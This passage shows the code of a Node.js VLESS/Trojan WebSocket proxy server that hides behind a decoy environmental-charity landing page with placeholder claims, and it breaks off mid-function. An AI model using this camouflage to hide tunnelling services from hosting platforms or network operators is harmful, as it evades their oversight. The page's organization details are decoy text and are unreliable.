readability */ font-size: 16px; } header { background: rgba(46, 125, 50, 0.95); /* Slightly transparent primary color */ color: var(--white); padding: 1rem 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .container { width: 90%; max-width: 1200px; margin: 0 auto; } .nav-container { display: flex; justify-content: space-between; align-items: center; } .logo { display: flex; align-items: center; gap: 10px; font-size: 1.8rem; font-weight: 700; } .logo i { font-size: 2rem; } nav ul { display: flex; list-style: none; } nav ul li { margin-left: 2rem; } nav ul li a { color: var(--white); text-decoration: none; font-weight: 500; transition: all 0.3s ease; padding: 0.5rem 0; position: relative; } nav ul li a:hover { color: var(--accent); } nav ul li a::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: var(--accent); transition: width 0.3s ease; } nav ul li a:hover::after { width: 100%; } .hero { background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.4)), url(\u0026#39;https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2073\u0026amp;q=80\u0026#39;); background-size: cover; background-position: center; height: 80vh; display: flex; align-items: center; text-align: center; color: var(--white); } .hero-content { max-width: 800px; margin: 0 auto; } .hero h1 { font-size: 3.5rem; margin-bottom: 1rem; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); } .hero p { font-size: 1.3rem; margin-bottom: 2rem; } .btn { display: inline-block; background-color: var(--accent); color: var(--white); padding: 0.9rem 2.2rem; /* Slightly larger padding */ border-radius: 8px; /* More modern rounded corners */ text-decoration: none; font-weight: 600; transition: all 0.3s ease; border: none; cursor: pointer; box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); /* Slightly enhanced shadow */ } .btn:hover { background-color: var(--primary); transform: translateY(-5px); /* More pronounced lift effect */ box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2); /* Stronger hover shadow */ } section { padding: 5rem 0; } .section-title { text-align: center; margin-bottom: 3rem; } .section-title h2 { font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem; position: relative; display: inline-block; } .section-title h2::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 90px; /* Slightly wider underline */ height: 5px; /* Thicker underline */ background-color: var(--accent); border-radius: 3px; } .section-title p { color: var(--text); max-width: 700px; margin: 0 auto; font-size: 1.1rem; } .about-content { display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; align-items: center; } .about-img { border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 12px 25px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .about-img img { width: 100%; height: auto; display: block; transition: transform 0.5s ease; } .about-img:hover img { transform: scale(1.08); /* More pronounced zoom */ } .about-text h3 { font-size: 2rem; margin-bottom: 1.5rem; color: var(--dark); } .about-text p { margin-bottom: 1.5rem; font-size: 1.05rem; } .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2rem; margin-top: 4rem; /* More space */ } .stat-item { text-align: center; padding: 2.5rem 1.5rem; /* More padding */ background-color: var(--white); border-radius: 12px; /* More rounded */ box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .stat-item:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .stat-item h3 { font-size: 3rem; /* Larger numbers */ color: var(--dark); margin-bottom: 0.8rem; } .stat-item p { color: var(--text); font-size: 1.1rem; } .initiatives { background-color: var(--white); } .initiatives-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2.5rem; } .initiative-card { background-color: var(--light); border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .initiative-card:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .initiative-img { height: 220px; /* Slightly taller images */ overflow: hidden; } .initiative-img img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.5s ease; } .initiative-card:hover .initiative-img img { transform: scale(1.15); /* More pronounced zoom */ } .initiative-content { padding: 2rem; } .initiative-content h3 { font-size: 1.6rem; margin-bottom: 1rem; color: var(--dark); } .initiative-content p { margin-bottom: 1.8rem; font-size: 1.05rem; } .cta { background: linear-gradient(to right, var(--primary), var(--secondary)); color: var(--white); text-align: center; padding: 6rem 0; /* More padding */ } .cta h2 { font-size: 3rem; /* Larger heading */ margin-bottom: 1.8rem; } .cta p { font-size: 1.3rem; margin-bottom: 2.5rem; max-width: 700px; margin-left: auto; margin-right: auto; } .cta .btn { background-color: var(--white); color: var(--primary); } .cta .btn:hover { background-color: var(--accent); color: var(--white); } footer { background-color: var(--dark); color: var(--white); padding: 4rem 0 2rem; /* More padding */ } .footer-content { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2.5rem; /* More gap */ margin-bottom: 2.5rem; } .footer-column h3 { font-size: 1.4rem; margin-bottom: 1.8rem; position: relative; padding-bottom: 12px; } .footer-column h3::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 50px; /* Wider underline */ height: 3px; /* Thicker underline */ background-color: var(--accent); } .footer-column p { margin-bottom: 1.2rem; } .footer-links { list-style: none; } .footer-links li { margin-bottom: 1rem; } .footer-links li a { color: var(--light); text-decoration: none; transition: all 0.3s ease; } .footer-links li a:hover { color: var(--accent); padding-left: 8px; /* More pronounced slide effect */ } .social-links { display: flex; gap: 1.2rem; margin-top: 1.5rem; } .social-links a { display: inline-flex; align-items: center; justify-content: center; width: 50px; /* Larger social buttons */ height: 50px; background-color: rgba(255, 255, 255, 0.15); /* Slightly more visible background */ border-radius: 8px; /* Square with rounded corners */ color: var(--white); text-decoration: none; font-weight: 600; transition: all 0.3s ease; font-size: 0.9rem; } .social-links a:hover { background-color: var(--accent); transform: translateY(-7px); /* More pronounced lift */ } .copyright { text-align: center; padding-top: 2.5rem; border-top: 1px solid rgba(255, 255, 255, 0.15); } .mobile-menu { display: none; font-size: 1.5rem; cursor: pointer; padding: 0.5rem 1rem; border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 5px; transition: all 0.3s ease; } .mobile-menu:hover { background-color: rgba(255, 255, 255, 0.1); } @media (max-width: 992px) { .about-content { grid-template-columns: 1fr; } .initiatives-grid { grid-template-columns: repeat(2, 1fr); } .footer-content { grid-template-columns: repeat(2, 1fr); } .stats { grid-template-columns: repeat(2, 1fr); } } @media (max-width: 768px) { .hero h1 { font-size: 2.8rem; /* Adjusted for better readability on smaller screens */ } .hero p { font-size: 1.2rem; /* Adjusted for better readability on smaller screens */ } nav ul { display: none; position: absolute; top: 100%; left: 0; width: 100%; background-color: var(--primary); flex-direction: column; padding: 1rem 0; text-align: center; box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1); } nav ul.active { display: flex; } nav ul li { margin: 0; padding: 0.8rem 0; } .mobile-menu { display: block; font-size: 1.2rem; /* Slightly smaller for mobile */ padding: 0.4rem 0.8rem; } .initiatives-grid { grid-template-columns: 1fr; } .footer-content { grid-template-columns: 1fr; } .stats { grid-template-columns: 1fr; } .social-links a { width: 45px; /* Slightly smaller social buttons */ height: 45px; font-size: 0.85rem; } } /* Animation for stats counter */ .counter { transition: all 0.5s ease; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- Header --\u0026gt; \u0026lt;header\u0026gt; \u0026lt;div class=\u0026#34;container nav-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span\u0026gt;Green Network\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;div class=\u0026#34;mobile-menu\u0026#34;\u0026gt; Menu \u0026lt;/div\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;!-- Hero Section --\u0026gt; \u0026lt;section class=\u0026#34;hero\u0026#34; id=\u0026#34;home\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container hero-content\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Protect Our Planet, Preserve Our Future\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Join the global movement to create a sustainable world through conservation, education, and community action.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#get-involved\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Join Our Network\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- About Section --\u0026gt; \u0026lt;section id=\u0026#34;about\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;About Green Network\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;We are a global community dedicated to environmental protection and sustainable development.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;about-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1507591064344-4c6ce005b128?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2070\u0026amp;q=80\u0026#34; alt=\u0026#34;Team planting trees\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-text\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Mission\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Green Network is committed to creating a sustainable future by protecting natural ecosystems, promoting renewable energy, and empowering communities to take environmental action.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Founded in 2010, we\u0026#39;ve grown from a small grassroots organization to an international network with over 50,000 members across 120 countries.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Our approach combines scientific research, community engagement, and policy advocacy to address the most pressing environmental challenges of our time.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;2500000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Trees Planted\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;50000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Active Members\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;120\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Countries Reached\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;1500\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Cleanup Projects\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Initiatives Section --\u0026gt; \u0026lt;section class=\u0026#34;initiatives\u0026#34; id=\u0026#34;initiatives\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Our Initiatives\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Discover the key programs and projects we\u0026#39;re implementing to protect our planet.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiatives-grid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://dialogue.earth/content/uploads/2021/04/lessons-from-the-rush-to-reforest-china-dialogue-2400x1599.jpg\u0026#34; alt=\u0026#34;Reforestation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Global Reforestation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Planting millions of trees worldwide to restore ecosystems, combat climate change, and protect biodiversity.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1621451537084-482c73073a0f?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=1974\u0026amp;q=80\u0026#34; alt=\u0026#34;Ocean Conservation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Ocean Conservation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Protecting marine ecosystems, reducing plastic pollution, and promoting sustainable fishing practices.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2072\u0026amp;q=80\u0026#34; alt=\u0026#34;Renewable Energy\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Renewable Energy\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Promoting solar, wind, and other clean energy sources to reduce dependence on fossil fuels.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- CTA Section --\u0026gt; \u0026lt;section class=\u0026#34;cta\u0026#34; id=\u0026#34;get-involved\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Join Our Global Movement\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Together, we can create a sustainable future for generations to come. Every action counts, no matter how small.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Become a Member\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Footer --\u0026gt; \u0026lt;footer id=\u0026#34;contact\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Green Network\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;We are dedicated to protecting our planet through collaborative action, education, and sustainable solutions.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;social-links\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Facebook\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Twitter\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Instagram\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;LinkedIn\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Quick Links\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Programs\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Reforestation\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Ocean Cleanup\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Wildlife Protection\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Climate Education\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Sustainable Agriculture\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Contact Us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Copper Creek Drive, New York\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;+1 (312) 171-0771\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;support@greennetwork.org\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026amp;copy; 2025 Green Network. All rights reserved.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;script\u0026gt; // Mobile Menu Toggle document.querySelector(\u0026#39;.mobile-menu\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, function() { document.querySelector(\u0026#39;nav ul\u0026#39;).classList.toggle(\u0026#39;active\u0026#39;); }); // Counter Animation function animateCounters() { const counters = document.querySelectorAll(\u0026#39;.counter\u0026#39;); const speed = 200; // The lower the slower counters.forEach(counter =\u0026gt; { const target = +counter.getAttribute(\u0026#39;data-target\u0026#39;); const count = +counter.innerText; const inc = target / speed; if(count \u0026lt; target) { counter.innerText = Math.ceil(count + inc); setTimeout(animateCounters, 1); } else { counter.innerText = target; } }); } // Initialize counters when page loads window.addEventListener(\u0026#39;load\u0026#39;, animateCounters); // Smooth scrolling for navigation links document.querySelectorAll(\u0026#39;a[href^=\u0026#34;#\u0026#34;]\u0026#39;).forEach(anchor =\u0026gt; { anchor.addEventListener(\u0026#39;click\u0026#39;, function(e) { e.preventDefault(); const targetId = this.getAttribute(\u0026#39;href\u0026#39;); if(targetId === \u0026#39;#\u0026#39;) return; const targetElement = document.querySelector(targetId); if(targetElement) { window.scrollTo({ top: targetElement.offsetTop - 80, behavior: \u0026#39;smooth\u0026#39; }); document.querySelector(\u0026#39;nav ul\u0026#39;).classList.remove(\u0026#39;active\u0026#39;); } }); }); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; package.json 文件，index.js 运行时需要依赖的安装包文件，安装了2个包，axios和ws\n{ \u0026#34;name\u0026#34;: \u0026#34;js01\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.0.1\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Nodejs-server\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;private\u0026#34;: false, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node index.js\u0026#34; }, \u0026#34;dependencies\u0026#34;: { \u0026#34;ws\u0026#34;: \u0026#34;^8.14.2\u0026#34;, \u0026#34;axios\u0026#34;: \u0026#34;^1.12.2\u0026#34; }, \u0026#34;engines\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;\u0026gt;=14\u0026#34; } } index.js 主文件，所有东西都在这里面\nconst http = require(\u0026#39;http\u0026#39;); const https = require(\u0026#39;https\u0026#39;); const fs = require(\u0026#39;fs\u0026#39;); const axios = require(\u0026#39;axios\u0026#39;); const net = require(\u0026#39;net\u0026#39;); const path = require(\u0026#39;path\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const { Buffer } = require(\u0026#39;buffer\u0026#39;); const { WebSocket, createWebSocketStream } = require(\u0026#39;ws\u0026#39;); // 生成 UUID v4 function generateUUID() { return crypto.randomUUID(); } const UUID = process.env.UUID || generateUUID(); const DOMAIN = process.env.DOMAIN || \u0026#39;1234.abc.com\u0026#39;; // 填写项目域名 const WSPATH = process.env.WSPATH || UUID.slice(0, 8); // 节点路径，默认获取uuid前8位 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 获取节点的订阅路径 const NAME = process.env.NAME || \u0026#39;\u0026#39;; // 节点名称 const PORT = process.env.PORT || 7860; // http和ws服务端口 const TLS_KEY_PATH = process.env.TLS_KEY_PATH || \u0026#39;tls.key\u0026#39;; const TLS_CERT_PATH = process.env.TLS_CERT_PATH || \u0026#39;tls.crt\u0026#39;; let ISP = \u0026#39;\u0026#39;; const GetISP = async () =\u0026gt; { try { const res = await axios.get(\u0026#39;https://api.ip.sb/geoip\u0026#39;); const data = res.data; ISP = `${data.country_code}-${data.isp}`.replace(/ /g, \u0026#39;_\u0026#39;); } catch (e) { ISP = \u0026#39;Unknown\u0026#39;; } } GetISP(); function normalizeSecret(value) { if (!value) return \u0026#39;\u0026#39;; return value.includes(\u0026#39;\\\\n\u0026#39;) ? value.replace(/\\\\n/g, \u0026#39;\\n\u0026#39;) : value; } function readOptionalFile(filePath) { if (!filePath) return \u0026#39;\u0026#39;; const resolvedPath = path.isAbsolute(filePath) ? filePath : path.join(__dirname, filePath); try { return fs.readFileSync(resolvedPath, \u0026#39;utf8\u0026#39;); } catch (error) { console.warn(`Failed to read TLS file ${resolvedPath}: ${error.message}`); return \u0026#39;\u0026#39;; } } function getTLSOptions() { let key = normalizeSecret(process.env.TLS_KEY); let cert = normalizeSecret(process.env.TLS_CERT); if (!key) { key = readOptionalFile(TLS_KEY_PATH); } if (!cert) { cert = readOptionalFile(TLS_CERT_PATH); } if (key \u0026amp;\u0026amp; cert) { return { key, cert }; } if (key || cert) { console.warn(\u0026#39;Both TLS key and certificate are required; falling back to HTTP.\u0026#39;); } return null; } const requestHandler = (req, res) =\u0026gt; { if (req.url === \u0026#39;/\u0026#39;) { const filePath = path.join(__dirname, \u0026#39;index.html\u0026#39;); fs.readFile(filePath, \u0026#39;utf8\u0026#39;, (err, content) =\u0026gt; { if (err) { res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(\u0026#39;Hello world!\u0026#39;); return; } res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; }); res.end(content); }); return; } else if (req.url === `/${SUB_PATH}`) { const namePart = NAME ? `${NAME}-${ISP}` : ISP; const vlessURL = `vless://${UUID}@${DOMAIN}:${PORT}?encryption=none\u0026amp;security=tls\u0026amp;sni=${DOMAIN}\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}\u0026amp;path=%2F${WSPATH}#${namePart}`; const trojanURL = `trojan://${UUID}@${DOMAIN}:${PORT}?security=tls\u0026amp;sni=${DOMAIN}\u0026amp;fp=chrome\u0026amp;type=ws\u0026amp;host=${DOMAIN}\u0026amp;path=%2F${WSPATH}#${namePart}`; const subscription = vlessURL + \u0026#39;\\n\u0026#39; + trojanURL; const base64Content = Buffer.from(subscription).toString(\u0026#39;base64\u0026#39;); res.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(base64Content + \u0026#39;\\n\u0026#39;); } else { res.writeHead(404, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/plain\u0026#39; }); res.end(\u0026#39;Not Found\\n\u0026#39;); } }; const tlsOptions = getTLSOptions(); const httpServer = tlsOptions ? https.createServer(tlsOptions, requestHandler) : http.createServer(requestHandler); const wss = new WebSocket.Server({ server: httpServer }); const uuid = UUID.replace(/-/g, \u0026#34;\u0026#34;); const DNS_SERVERS = [\u0026#39;8.8.4.4\u0026#39;, \u0026#39;1.1.1.1\u0026#39;]; // Custom DNS function resolveHost(host) { return new Promise((resolve, reject) =\u0026gt; { if (/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(host)) { resolve(host); return; } let attempts = 0; function tryNextDNS() { if (attempts \u0026gt;= DNS_SERVERS.length) { reject(new Error(`Failed to resolve ${host} with all DNS servers`)); return; } const dnsServer = DNS_SERVERS[attempts]; attempts++; const dnsQuery = `https://dns.google/resolve?name=${encodeURIComponent(host)}\u0026amp;type=A`; axios.get(dnsQuery, { timeout: 5000, headers: { \u0026#39;Accept\u0026#39;: \u0026#39;application/dns-json\u0026#39; } }) .then(response =\u0026gt; { const data = response.data; if (data.Status === 0 \u0026amp;\u0026amp; data.Answer \u0026amp;\u0026amp; data.Answer.length \u0026gt; 0) { const ip = data.Answer.find(record =\u0026gt; record.type === 1); if (ip) { resolve(ip.data); return; } } tryNextDNS(); }) .catch(error =\u0026gt; { tryNextDNS(); }); } tryNextDNS(); }); } // VLE-SS处理 function handleVlessConnection(ws, msg) { const [VERSION] = msg; const id = msg.slice(1, 17); if (!id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16))) return false; let i = msg.slice(17, 18).readUInt8() + 19; const port = msg.slice(i, i += 2).readUInt16BE(0); const ATYP = msg.slice(i, i += 1).readUInt8(); const host = ATYP == 1 ? msg.slice(i, i += 4).join(\u0026#39;.\u0026#39;) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, 